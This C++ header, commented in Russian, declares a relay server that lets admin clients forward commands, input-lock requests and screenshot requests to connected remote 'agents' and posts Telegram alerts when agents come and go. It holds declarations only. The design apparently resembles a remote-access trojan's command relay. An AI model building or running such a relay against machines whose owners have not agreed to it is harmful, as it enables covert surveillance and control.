#pragma once

#include <string>
#include <map>
#include <mutex>
#include <atomic>
#include <memory>
#include <thread>
#include "../common/protocol.h"

// Telegram Bot настройки (обязательны: задаются при сборке через -DTELEGRAM_BOT_TOKEN=... -DTELEGRAM_CHAT_ID=...)
#ifndef TELEGRAM_BOT_TOKEN
#error "TELEGRAM_BOT_TOKEN must be provided via -DTELEGRAM_BOT_TOKEN=..."
#endif

#ifndef TELEGRAM_CHAT_ID
#error "TELEGRAM_CHAT_ID must be provided via -DTELEGRAM_CHAT_ID=..."
#endif

struct ConnectedAgent {
    int socket;
    std::string id;
    std::string name;
    std::string os;
    std::string ip;
    bool online;
    std::mutex socket_mutex;
};

struct ConnectedAdmin {
    int socket;
    std::string selected_agent_id;
    std::mutex socket_mutex;
};

class RelayServer {
public:
    RelayServer(uint16_t port, const std::string& admin_token);
    ~RelayServer();
    
    bool start();
    void stop();
    bool isRunning() const { return m_running; }

private:
    void acceptConnections();
    void handleConnection(int client_socket, const std::string& client_ip);
    void handleAgent(int client_socket, const std::string& agent_id);
    void handleAdmin(int client_socket);
    
    // Утилиты
    bool sendAll(int socket, const uint8_t* data, size_t size);
    bool recvAll(int socket, uint8_t* data, size_t size);
    bool sendPacket(int socket, uint8_t msg_type, const std::string& payload);
    
    // Получение списка агентов
    std::string getAgentsList();
    
    // Пересылка команды агенту
    bool forwardCommandToAgent(const std::string& agent_id, const std::string& command, std::string& response);
    
    // Пересылка команды блокировки/разблокировки ввода
    bool forwardInputCommand(const std::string& agent_id, RemoteProto::MessageType cmd_type,
                             RemoteProto::MessageType& response_type, std::string& response);
    
    // Telegram уведомления
    void sendTelegramNotification(const std::string& message);
    void sendTelegramPhoto(const std::vector<uint8_t>& photo_data, const std::string& caption);
    void notifyAgentConnected(const std::string& name, const std::string& os, const std::string& ip);
    void notifyAgentDisconnected(const std::string& name);
    
    // Скриншот
    bool forwardScreenshotRequest(const std::string& agent_id, std::vector<uint8_t>& screenshot_data);

    // Пинг агента для снятия "подвисших" соединений
    bool pingAgent(const std::string& agent_id);

    uint16_t m_port;
    std::string m_admin_token;
    int m_server_socket;
    std::atomic<bool> m_running;
    
    std::map<std::string, std::shared_ptr<ConnectedAgent>> m_agents;
    std::mutex m_agents_mutex;
    
    std::map<int, std::shared_ptr<ConnectedAdmin>> m_admins;
    std::mutex m_admins_mutex;
};

